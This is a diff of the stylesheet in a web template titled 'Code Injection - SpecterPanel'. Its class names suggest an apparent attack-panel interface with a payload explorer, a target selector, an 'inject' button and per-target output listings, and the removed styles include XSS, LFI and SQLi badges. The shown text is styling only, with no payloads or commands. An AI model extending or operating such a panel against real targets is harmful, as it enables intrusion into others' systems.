@@ -2,741 +2,4021 @@
 {% block title %}Code Injection - SpecterPanel{% endblock %}
 
 {% block style %}
-<style>
-  :root {
-    --primary-color: #00ff41;
-    --primary-dark: #00cc33;
-    --primary-light: #33ff6b;
-    --secondary-color: #0088ff;
-    --accent-color: #ff0088;
-    --danger-color: #ff0033;
-    --success-color: #00ff41;
-    --dark-bg: #0a0a0a;
-    --medium-bg: #111111;
-    --light-bg: #1a1a1a;
-    --border-color: #333;
-    --text-primary: #ffffff;
-    --text-secondary: #888888;
-    --gradient-primary: linear-gradient(135deg, #00ff41 0%, #0088ff 100%);
-    --glow-primary: 0 0 10px rgba(0, 255, 65, 0.5), 0 0 20px rgba(0, 255, 65, 0.3);
-    --shadow: 0 4px 6px rgba(0, 0, 0, 0.7);
-  }
+    {{ super() }}
+    <style>
+        /* === HACKING THEME EDITOR STYLE === */
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-  * {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-  }
+        .editor-page {
+            height: 100%;
+            width: 100%;
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
+            overflow: hidden;
+            position: relative;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(0, 255, 65, 0.03) 0%, transparent 20%),
+                radial-gradient(circle at 80% 70%, rgba(0, 136, 255, 0.03) 0%, transparent 20%);
+        }
 
-  body {
-    background-color: var(--dark-bg);
-    color: var(--text-primary);
-    font-family: 'JetBrains Mono', monospace;
-    line-height: 1.6;
-    min-height: 100vh;
-  }
+        /* Matrix rain overlay */
+        .matrix-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.1;
+            z-index: 0;
+        }
 
-  .main-container {
-    max-width: 1400px;
-    margin: 0 auto;
-    padding: 20px;
-  }
+        /* === EDITOR CONTAINER === */
+        .editor-container {
+            width: 100%;
+            height: calc(100vh - 70px);
+            display: flex;
+            flex-direction: column;
+            background: rgba(10, 10, 10, 0.8);
+            position: relative;
+            z-index: 1;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+        }
 
-  .header {
-    text-align: center;
-    margin-bottom: 30px;
-    padding-bottom: 20px;
-    border-bottom: 1px solid rgba(0, 255, 65, 0.3);
-  }
+        /* === EDITOR HEADER === */
+        .editor-header {
+            height: 50px;
+            min-height: 50px;
+            background: rgba(17, 17, 17, 0.95);
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 20px;
+            flex-shrink: 0;
+            backdrop-filter: blur(10px);
+        }
 
-  .header h1 {
-    color: var(--primary-color);
-    margin-bottom: 10px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 15px;
-    text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
-    font-weight: 700;
-  }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #00ff41;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
 
-  .header p {
-    color: var(--text-secondary);
-    max-width: 700px;
-    margin: 0 auto;
-    font-size: 1.1rem;
-  }
+        .logo-icon {
+            color: #00ff41;
+            filter: drop-shadow(0 0 5px rgba(0, 255, 65, 0.7));
+        }
 
-  .warning-banner {
-    background: rgba(255, 167, 38, 0.1);
-    border: 1px solid rgba(255, 167, 38, 0.3);
-    border-left: 4px solid #ffa726;
-    padding: 15px;
-    margin-bottom: 25px;
-    border-radius: 6px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    box-shadow: var(--glow-primary);
-  }
+        /* File Tabs */
+        .file-tabs {
+            display: flex;
+            gap: 2px;
+            flex: 1;
+            overflow-x: auto;
+        }
 
-  .warning-banner i {
-    color: #ffa726;
-    font-size: 1.2rem;
-  }
+        .file-tab {
+            padding: 8px 16px;
+            background: rgba(34, 34, 34, 0.8);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            color: #cccccc;
+            font-size: 13px;
+            cursor: pointer;
+            white-space: nowrap;
+            min-width: 120px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            font-family: 'JetBrains Mono', monospace;
+        }
 
-  .top-container {
-    display: flex;
-    gap: 25px;
-    margin-bottom: 25px;
-    flex-wrap: wrap;
-  }
+        .file-tab:hover {
+            background: rgba(0, 255, 65, 0.1);
+            border-color: rgba(0, 255, 65, 0.5);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
 
-  .box {
-    flex: 1;
-    border-radius: 8px;
-    background: rgba(17, 17, 17, 0.8);
-    backdrop-filter: blur(20px);
-    box-shadow: var(--shadow), var(--glow-primary);
-    transition: all 0.3s ease;
-    min-width: 300px;
-    overflow: hidden;
-    display: flex;
-    flex-direction: column;
-    border: 1px solid rgba(0, 255, 65, 0.3);
-  }
+        .file-tab.active {
+            background: rgba(0, 255, 65, 0.15);
+            color: #00ff41;
+            border-color: #00ff41;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
 
-  .box:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.8), 0 0 30px rgba(0, 255, 65, 0.4);
-  }
+        .file-tab .file-icon {
+            color: #ff0088;
+            font-size: 12px;
+            filter: drop-shadow(0 0 3px rgba(255, 0, 136, 0.5));
+        }
 
-  .box h3 {
-    margin: 0;
-    padding: 18px;
-    background: rgba(0, 255, 65, 0.1);
-    color: var(--primary-color);
-    font-size: 1.1rem;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
-    border-bottom: 1px solid rgba(0, 255, 65, 0.2);
-  }
+        /* Editor Controls */
+        .editor-controls {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
 
-  /* Payload Table */
-  .payload-table {
-    width: 100%;
-    border-collapse: collapse;
-    flex: 1;
-    background: rgba(10, 10, 10, 0.5);
-  }
+        .editor-btn {
+            padding: 6px 12px;
+            background: rgba(0, 136, 255, 0.2);
+            border: 1px solid rgba(0, 136, 255, 0.5);
+            color: #0088ff;
+            font-size: 13px;
+            cursor: pointer;
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.3s ease;
+            font-family: 'JetBrains Mono', monospace;
+            text-shadow: 0 0 5px rgba(0, 136, 255, 0.5);
+        }
 
-  .payload-table th {
-    background-color: rgba(0, 255, 65, 0.15);
-    color: var(--primary-color);
-    padding: 15px;
-    text-align: left;
-    font-weight: 600;
-    position: sticky;
-    top: 0;
-    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
-    border-bottom: 2px solid rgba(0, 255, 65, 0.3);
-  }
+        .editor-btn:hover {
+            background: rgba(0, 136, 255, 0.3);
+            border-color: #0088ff;
+            box-shadow: 0 0 15px rgba(0, 136, 255, 0.4);
+            transform: translateY(-2px);
+        }
 
-  .payload-table td {
-    padding: 15px;
-    border-bottom: 1px solid rgba(0, 255, 65, 0.1);
-    color: var(--text-primary);
-    text-align: left;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.9rem;
-    transition: all 0.3s ease;
-  }
+        .editor-btn#btn-inject {
+            background: rgba(255, 0, 51, 0.2);
+            border-color: rgba(255, 0, 51, 0.5);
+            color: #ff0033;
+            text-shadow: 0 0 5px rgba(255, 0, 51, 0.5);
+        }
 
-  .payload-table tr:last-child td {
-    border-bottom: none;
-  }
+        .editor-btn#btn-inject:hover {
+            background: rgba(255, 0, 51, 0.3);
+            border-color: #ff0033;
+            box-shadow: 0 0 15px rgba(255, 0, 51, 0.4);
+        }
 
-  .payload-table tr:hover td {
-    background-color: rgba(0, 255, 65, 0.05);
-    cursor: pointer;
-    transform: translateX(5px);
-  }
+        .editor-btn.secondary {
+            background: rgba(0, 255, 65, 0.1);
+            border-color: rgba(0, 255, 65, 0.3);
+            color: #00ff41;
+        }
 
-  .payload-table tr.selected td {
-    background-color: rgba(0, 255, 65, 0.1);
-    border-left: 3px solid var(--primary-color);
-  }
+        .editor-btn.secondary:hover {
+            background: rgba(0, 255, 65, 0.2);
+            border-color: #00ff41;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
 
-  .payload-table .payload-type {
-    font-size: 0.75rem;
-    padding: 4px 8px;
-    border-radius: 4px;
-    margin-left: 8px;
-    font-weight: 600;
-    border: 1px solid;
-  }
+        /* === EDITOR LAYOUT === */
+        .editor-layout {
+            display: flex;
+            flex: 1;
+            min-height: 0;
+            overflow: hidden;
+            background: #0a0a0a;
+        }
 
-  .type-xss {
-    background: rgba(244, 67, 54, 0.2);
-    color: #f44336;
-    border-color: rgba(244, 67, 54, 0.3);
-  }
+        /* === SIDEBAR - PAYLOAD EXPLORER === */
+        .sidebar {
+            width: 250px;
+            min-width: 250px;
+            background: rgba(17, 17, 17, 0.95);
+            border-right: 1px solid rgba(0, 255, 65, 0.3);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            flex-shrink: 0;
+            backdrop-filter: blur(5px);
+        }
 
-  .type-lfi {
-    background: rgba(66, 165, 245, 0.2);
-    color: var(--secondary-color);
-    border-color: rgba(66, 165, 245, 0.3);
-  }
+        .sidebar-header {
+            padding: 15px 20px;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+            background: rgba(34, 34, 34, 0.8);
+            flex-shrink: 0;
+        }
 
-  .type-sqli {
-    background: rgba(102, 187, 106, 0.2);
-    color: var(--success-color);
-    border-color: rgba(102, 187, 106, 0.3);
-  }
+        .sidebar-title {
+            font-size: 13px;
+            color: #00ff41;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-shadow: 0 0 5px rgba(0, 255, 65, 0.5);
+        }
 
-  /* Code Editor */
-  .editor-container {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-  }
+        .sidebar-title i {
+            color: #ff0088;
+            filter: drop-shadow(0 0 3px rgba(255, 0, 136, 0.5));
+        }
 
-  .editor {
-    flex: 1;
-    padding: 20px;
-    background-color: #181818;
-    border: none;
-    color: var(--primary-color);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 14px;
-    resize: none;
-    line-height: 1.5;
-    tab-size: 2;
-    border-bottom: 1px solid rgba(0, 255, 65, 0.2);
-  }
+        .file-tree {
+            flex: 1;
+            padding: 10px;
+            overflow-y: auto;
+            min-height: 0;
+        }
 
-  .editor:focus {
-    outline: none;
-    box-shadow: inset 0 0 0 2px var(--primary-color);
-  }
+        .file-item {
+            padding: 8px 12px;
+            margin: 2px 0;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #cccccc;
+            border: 1px solid transparent;
+            font-family: 'JetBrains Mono', monospace;
+        }
 
-  /* Controls */
-  .controls {
-    display: flex;
-    justify-content: space-between;
-    padding: 15px;
-    background: rgba(0, 255, 65, 0.1);
-    gap: 15px;
-    flex-wrap: wrap;
-  }
+        .file-item:hover {
+            background: rgba(0, 255, 65, 0.1);
+            border-color: rgba(0, 255, 65, 0.2);
+            transform: translateX(5px);
+        }
 
-  .select-wrapper {
-    position: relative;
-    flex: 1;
-    min-width: 200px;
-  }
+        .file-item.active {
+            background: rgba(0, 255, 65, 0.15);
+            color: #00ff41;
+            border-color: rgba(0, 255, 65, 0.4);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+        }
 
-  .select-wrapper::after {
-    content: '▼';
-    position: absolute;
-    top: 50%;
-    right: 15px;
-    transform: translateY(-50%);
-    color: var(--primary-color);
-    font-size: 0.7rem;
-    pointer-events: none;
-    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
-  }
+        .file-item i {
+            font-size: 12px;
+            width: 16px;
+            color: #ff0088;
+            filter: drop-shadow(0 0 3px rgba(255, 0, 136, 0.5));
+        }
 
-  select {
-    width: 100%;
-    padding: 12px 15px;
-    border-radius: 6px;
-    border: 1px solid rgba(0, 255, 65, 0.3);
-    background: rgba(17, 17, 17, 0.8);
-    color: var(--primary-color);
-    font-size: 14px;
-    font-family: 'JetBrains Mono', monospace;
-    appearance: none;
-    cursor: pointer;
-    transition: all 0.3s ease;
-  }
+        /* === MAIN EDITOR AREA === */
+        .editor-main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+            min-height: 0;
+            overflow: hidden;
+        }
 
-  select:focus {
-    outline: none;
-    border-color: var(--primary-color);
-    box-shadow: var(--glow-primary);
-  }
+        /* Editor Toolbar */
+        .editor-toolbar {
+            height: 35px;
+            min-height: 35px;
+            background: rgba(34, 34, 34, 0.9);
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            gap: 15px;
+            flex-shrink: 0;
+            backdrop-filter: blur(5px);
+        }
 
-  .btn {
-    padding: 12px 20px;
-    border-radius: 6px;
-    border: 1px solid;
-    font-weight: 600;
-    font-size: 14px;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    font-family: 'JetBrains Mono', monospace;
-    text-transform: uppercase;
-  }
+        .toolbar-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
 
-  .btn-primary {
-    background: var(--gradient-primary);
-    border-color: rgba(0, 255, 65, 0.5);
-    color: var(--dark-bg);
-  }
+        .toolbar-btn {
+            padding: 4px 8px;
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            color: #00ff41;
+            cursor: pointer;
+            border-radius: 2px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            transition: all 0.3s ease;
+            font-family: 'JetBrains Mono', monospace;
+        }
 
-  .btn-primary:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 0 25px rgba(0, 255, 65, 0.6);
-  }
+        .toolbar-btn:hover {
+            background: rgba(0, 255, 65, 0.2);
+            border-color: #00ff41;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+            transform: translateY(-1px);
+        }
 
-  .btn-danger {
-    background: rgba(255, 0, 51, 0.2);
-    border-color: rgba(255, 0, 51, 0.5);
-    color: #ff0033;
-  }
+        .target-select {
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            color: #00ff41;
+            padding: 4px 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            border-radius: 2px;
+            cursor: pointer;
+            min-width: 150px;
+        }
 
-  .btn-danger:hover {
-    background: rgba(255, 0, 51, 0.3);
-    transform: translateY(-2px);
-    box-shadow: 0 0 20px rgba(255, 0, 51, 0.4);
-  }
+        .target-select:focus {
+            outline: none;
+            border-color: #00ff41;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
 
-  /* Result box */
-  .result {
-    border-radius: 8px;
-    background: rgba(17, 17, 17, 0.8);
-    backdrop-filter: blur(20px);
-    box-shadow: var(--shadow), var(--glow-primary);
-    overflow: hidden;
-    border: 1px solid rgba(0, 255, 65, 0.3);
-  }
+        .target-select.error {
+            border-color: #ff0033 !important;
+            box-shadow: 0 0 10px rgba(255, 0, 51, 0.5) !important;
+            animation: pulse-error 0.5s ease-in-out;
+        }
 
-  .result h3 {
-    margin: 0;
-    padding: 18px;
-    background: rgba(0, 255, 65, 0.1);
-    color: var(--primary-color);
-    font-size: 1.1rem;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
-    border-bottom: 1px solid rgba(0, 255, 65, 0.2);
-  }
+        @keyframes pulse-error {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
 
-  .result-content {
-    padding: 20px;
-    min-height: 200px;
-    font-family: 'JetBrains Mono', monospace;
-    color: var(--primary-color);
-    white-space: pre-wrap;
-    background-color: #181818;
-    border-radius: 0 0 8px 8px;
-    overflow-x: auto;
-    line-height: 1.6;
-  }
+        /* Code Editor Container */
+        .code-container {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+            min-height: 0;
+            background: #0a0a0a;
+        }
 
-  .result-error {
-    color: var(--danger-color);
-    text-shadow: 0 0 10px rgba(255, 0, 51, 0.3);
-  }
+        /* Line Numbers */
+        .line-numbers {
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 50px;
+            background: rgba(17, 17, 17, 0.8);
+            border-right: 1px solid rgba(0, 255, 65, 0.3);
+            padding: 10px 0;
+            text-align: right;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: #00ff41;
+            user-select: none;
+            z-index: 1;
+            overflow: hidden;
+            text-shadow: 0 0 5px rgba(0, 255, 65, 0.5);
+        }
 
-  .result-success {
-    color: var(--success-color);
-    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
-  }
+        .line-number {
+            padding: 0 10px;
+            height: 18px;
+            line-height: 18px;
+            opacity: 0.7;
+        }
 
-  /* Status indicators */
-  .status-indicator {
-    display: inline-flex;
-    align-items: center;
-    gap: 0.5rem;
-    font-size: 0.875rem;
-    margin-left: 10px;
-  }
+        .line-number.active {
+            opacity: 1;
+            color: #ffffff;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.8);
+        }
 
-  .status-indicator::before {
-    content: '';
-    width: 8px;
-    height: 8px;
-    border-radius: 50%;
-    background: var(--primary-color);
-    box-shadow: 0 0 10px var(--primary-color);
-    animation: pulse 2s infinite;
-  }
+        /* Code Editor - Now a normal textarea */
+        .code-editor {
+            position: absolute;
+            left: 50px;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            padding: 10px;
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
+            font-size: 13px;
+            line-height: 18px;
+            white-space: pre;
+            overflow-x: auto;
+            overflow-y: auto;
+            tab-size: 4;
+            background: transparent;
+            color: #00ff41;
+            caret-color: #00ff41;
+            outline: none;
+            border: none;
+            resize: none;
+            z-index: 2;
+            text-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
+            word-break: normal;
+        }
 
-  @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.5; }
-  }
+        .code-editor::placeholder {
+            color: rgba(0, 255, 65, 0.5);
+        }
 
-  /* Responsive design */
-  @media (max-width: 768px) {
-    .top-container {
-      flex-direction: column;
-    }
-    
-    .box {
-      min-width: 100%;
-    }
-    
-    .controls {
-      flex-direction: column;
-    }
-    
-    .btn {
-      width: 100%;
-      justify-content: center;
-    }
+        .code-editor::selection {
+            background: rgba(0, 255, 65, 0.3);
+            color: #ffffff;
+        }
 
-    .header h1 {
-      font-size: 1.5rem;
-    }
-  }
+        /* === RIGHT PANEL === */
+        .editor-panel {
+            width: 300px;
+            min-width: 300px;
+            background: rgba(17, 17, 17, 0.95);
+            border-left: 1px solid rgba(0, 255, 65, 0.3);
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+            overflow: hidden;
+            backdrop-filter: blur(5px);
+        }
 
-  /* Animations */
-  @keyframes pulse {
-    0% { opacity: 0.6; }
-    50% { opacity: 1; }
-    100% { opacity: 0.6; }
-  }
+        .panel-tabs {
+            display: flex;
+            background: rgba(34, 34, 34, 0.8);
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+            flex-shrink: 0;
+        }
 
-  .loading {
-    animation: pulse 1.5s infinite ease-in-out;
-    color: var(--primary-color) !important;
-  }
+        .panel-tab {
+            padding: 10px 15px;
+            background: transparent;
+            border: none;
+            color: #cccccc;
+            font-size: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.3s ease;
+            font-family: 'JetBrains Mono', monospace;
+        }
 
-  /* Terminal-style elements */
-  .terminal-text {
-    color: var(--primary-color);
-    font-family: 'JetBrains Mono', monospace;
-    text-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
-  }
+        .panel-tab:hover {
+            background: rgba(0, 255, 65, 0.1);
+            color: #00ff41;
+        }
 
-  /* Matrix background effect for headers */
-  .matrix-bg {
-    position: relative;
-    overflow: hidden;
-  }
+        .panel-tab.active {
+            background: rgba(0, 255, 65, 0.15);
+            color: #00ff41;
+            border-bottom: 2px solid #00ff41;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+        }
 
-  .matrix-bg::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    background: 
-      linear-gradient(90deg, transparent 98%, rgba(0, 255, 65, 0.1) 100%),
-      linear-gradient(0deg, transparent 98%, rgba(0, 255, 65, 0.1) 100%);
-    background-size: 20px 20px;
-    pointer-events: none;
-    opacity: 0.3;
-  }
+        /* Panel Content */
+        .panel-content {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            min-height: 0;
+            background: #0a0a0a;
+        }
 
-  /* Tooltip */
-  [data-tooltip] {
-    position: relative;
-  }
+        /* Output Console */
+        .console-output {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            line-height: 1.4;
+        }
 
-  [data-tooltip]:hover::after {
-    content: attr(data-tooltip);
-    position: absolute;
-    bottom: 100%;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(17, 17, 17, 0.9);
-    color: var(--primary-color);
-    padding: 8px 12px;
-    border-radius: 4px;
-    font-size: 0.8rem;
-    white-space: nowrap;
-    z-index: 10;
-    margin-bottom: 8px;
-    border: 1px solid rgba(0, 255, 65, 0.3);
-    box-shadow: var(--glow-primary);
-    font-family: 'JetBrains Mono', monospace;
-  }
-</style>
+        .console-line {
+            margin-bottom: 6px;
+            padding-left: 20px;
+            position: relative;
+            color: #00ff41;
+            text-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .console-line::before {
+            content: '>';
+            position: absolute;
+            left: 0;
+            color: #0088ff;
+            text-shadow: 0 0 5px rgba(0, 136, 255, 0.5);
+        }
+
+        .console-line.error {
+            color: #ff0033;
+            text-shadow: 0 0 5px rgba(255, 0, 51, 0.5);
+        }
+
+        .console-line.success {
+            color: #00ff41;
+            text-shadow: 0 0 5px rgba(0, 255, 65, 0.5);
+        }
+
+        .console-line.info {
+            color: #0088ff;
+            text-shadow: 0 0 5px rgba(0, 136, 255, 0.5);
+        }
+
+        .console-line.warning {
+            color: #ffaa00;
+            text-shadow: 0 0 5px rgba(255, 170, 0, 0.5);
+        }
+
+        /* Output Notification Styles */
+        .output-panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+        }
+
+        .output-panel-header h3 {
+            color: #00ff41;
+            font-size: 14px;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .notification-badge {
+            background: #ff0033;
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .clear-all-btn {
+            background: rgba(255, 0, 51, 0.2);
+            color: #ff0033;
+            border: 1px solid #ff0033;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .clear-all-btn:hover {
+            background: rgba(255, 0, 51, 0.3);
+        }
+
+        .output-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .output-item {
+            background: rgba(20, 20, 30, 0.8);
+            border: 1px solid rgba(0, 136, 255, 0.3);
+            border-left: 3px solid #00ff41;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 10px;
+            animation: slideInRight 0.3s ease-out;
+            transition: all 0.3s ease;
+        }
+
+        @keyframes slideInRight {
+            from {
+                opacity: 0;
+                transform: translateX(100%);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes slideOutRight {
+            from {
+                opacity: 1;
+                transform: translateX(0);
+            }
+            to {
+                opacity: 0;
+                transform: translateX(100%);
+            }
+        }
+
+        .output-item.read {
+            border-left-color: #666;
+            opacity: 0.7;
+        }
+
+        .output-item-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 10px;
+        }
+
+        .output-target-info {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .target-name {
+            color: #0088ff;
+            font-weight: bold;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .payload-name {
+            color: #00ff41;
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .output-timestamp {
+            color: #888;
+            font-size: 10px;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .output-item-body {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .output-status .status-badge {
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 10px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .status-pending {
+            background: rgba(255, 204, 0, 0.2);
+            color: #ffcc00;
+            border: 1px solid #ffcc00;
+        }
+
+        .status-viewed {
+            background: rgba(0, 255, 65, 0.2);
+            color: #00ff41;
+            border: 1px solid #00ff41;
+        }
+
+        .status-error {
+            background: rgba(255, 0, 51, 0.2);
+            color: #ff0033;
+            border: 1px solid #ff0033;
+        }
+
+        .output-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .show-output-btn {
+            background: rgba(0, 136, 255, 0.2);
+            color: #0088ff;
+            border: 1px solid #0088ff;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .show-output-btn:hover {
+            background: rgba(0, 136, 255, 0.3);
+        }
+
+        .dismiss-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: #888;
+            border: 1px solid #444;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 10px;
+            transition: all 0.3s;
+        }
+
+        .dismiss-btn:hover {
+            background: rgba(255, 0, 51, 0.2);
+            color: #ff0033;
+            border-color: #ff0033;
+        }
+
+        /* Output Modal Styles */
+        .output-modal-content {
+            background: rgba(10, 10, 15, 0.98);
+            border: 2px solid #00ff41;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow: hidden;
+        }
+
+        .output-modal-header {
+            background: rgba(0, 255, 65, 0.1);
+            padding: 15px;
+            border-bottom: 1px solid #00ff41;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .output-modal-header h2 {
+            color: #00ff41;
+            margin: 0;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .close-output-modal {
+            background: none;
+            border: none;
+            color: #00ff41;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .close-output-modal:hover {
+            color: #ff0033;
+        }
+
+        .output-modal-body {
+            padding: 20px;
+            overflow-y: auto;
+            max-height: calc(80vh - 60px);
+        }
+
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+        }
+
+        .matrix-spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(0, 255, 65, 0.3);
+            border-top: 3px solid #00ff41;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .error-container {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .error-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        .error-title {
+            color: #ff0033;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .error-message {
+            color: #ff6666;
+            margin-bottom: 20px;
+        }
+
+        .error-details {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+
+        .retry-btn {
+            background: rgba(255, 0, 51, 0.2);
+            color: #ff0033;
+            border: 1px solid #ff0033;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 0 auto;
+        }
+
+        .retry-btn:hover {
+            background: rgba(255, 0, 51, 0.3);
+        }
+
+        .output-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .output-header-left {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .output-target {
+            color: #00ff41;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .output-header-right {
+            display: flex;
+            gap: 10px;
